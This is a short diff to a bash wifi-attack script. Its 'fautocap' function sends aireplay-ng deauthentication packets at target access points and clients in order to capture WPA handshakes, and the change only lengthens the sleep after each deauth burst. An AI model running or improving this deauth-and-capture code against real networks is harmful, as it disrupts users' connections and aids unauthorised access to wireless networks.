@@ -725,7 +725,7 @@ fautocap()																#Deauth targets and collect handshakes
 									MACNUM=$((MACNUM + 1))
 									echo
 									aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON1 | grep sdvds&
-									sleep 1
+									sleep $((PACKS + 1))'.5'
 									echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
 									fanalyze
 									if [ $GDONE = 1 ] 2> /dev/null
@@ -752,7 +752,7 @@ fautocap()																#Deauth targets and collect handshakes
 											MACNUM=$((MACNUM + 1))
 											echo
 											aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
-											sleep 1
+											sleep $((PACKS + 1))'.5'
 											echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
 											fanalyze
 											if [ $GDONE = 1 ] 2> /dev/null
@@ -782,7 +782,7 @@ fautocap()																#Deauth targets and collect handshakes
 									MACNUM=$((MACNUM + 1))
 									echo
 									aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
-									sleep 1
+									sleep $((PACKS + 1))'.5'
 									echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
 									fanalyze
 									if [ $GDONE = 1 ] 2> /dev/null
